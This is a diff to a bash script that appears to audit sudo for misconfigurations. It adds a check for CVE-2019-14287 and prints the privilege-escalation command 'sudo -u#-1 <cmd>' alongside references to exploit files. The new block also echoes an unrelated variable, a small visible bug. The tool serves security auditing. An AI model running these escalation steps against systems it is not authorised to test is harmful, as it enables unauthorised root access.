@@ -1,8 +1,8 @@
 #!/bin/bash
 # This script was to developed to check for common misconfigurations and vulnerabilities of the sudo 
-# Version="version 1.3"
+# Version="version 1.3.7"
 # Date Created : 08/12/2018
-# Date of last modification : 06/08/2019
+# Date of last modification : 16/10/2019
 # @TH3_ACE - BLAIS David
 
 # Future updates :
@@ -348,6 +348,25 @@ if [ "$sudodblwildcard" ]; then
   echo -e "[*] Exploit: /exploits/CVE-2015-5602.sh"  
   echo -e "\n" 
 #  echo -e "[-] run the command: sudo ./CVE-2015-5602.sh then su [RANDOM PASSWORD GENERATED]\n"  
+else
+  :
+fi
+
+
+sudorunas=`echo '' | sudo -S -l -k 2>/dev/null | grep "(ALL, \!root)"`
+if [ "$sudorunas" ]; then
+
+cmd=`echo '' | sudo -S -l -k 2>/dev/null | grep "(ALL, \!root)" | cut -d" " -f 3 | grep -v "NOPASSWD"`
+
+  echo -e "\n"
+  echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2019-14287: ${RESET} \n $sudodblwildcard"
+  echo -e "[-] Vulnerable to CVE-2019-14287 if the sudo version is <=1.8.27, check the version of sudo"
+  echo -e "[-] Example : sudo -u#-1 /usr/bin/id"  
+  echo -e "[-] Run command : sudo -u#-1 <cmd>"
+  echo -e "[-] where <cmd> is one of the following:"
+  echo -e "[-] $cmd"
+  echo -e "[*] Exploit: /exploits/CVE-2019-14287.txt"  
+  echo -e "\n" 
 else
   :
 fi
